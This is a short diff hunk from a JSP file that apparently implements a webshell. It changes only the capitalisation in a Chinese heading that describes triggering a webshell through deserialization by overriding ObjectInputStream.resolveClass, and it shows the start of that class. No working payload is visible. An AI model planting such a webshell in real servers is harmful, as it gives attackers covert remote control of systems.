@@ -11,7 +11,7 @@
 <%@ page import="java.util.Base64" %>
 <html>
 <body>
-<h2>重写ObjectInputStream.resolveClass实现反序列化readObject触发的JSP Webshell</h2>
+<h2>重写ObjectInputStream.resolveClass实现反序列化readObject触发的JSP WebShell</h2>
 <%
     class Custom extends ObjectInputStream {
 
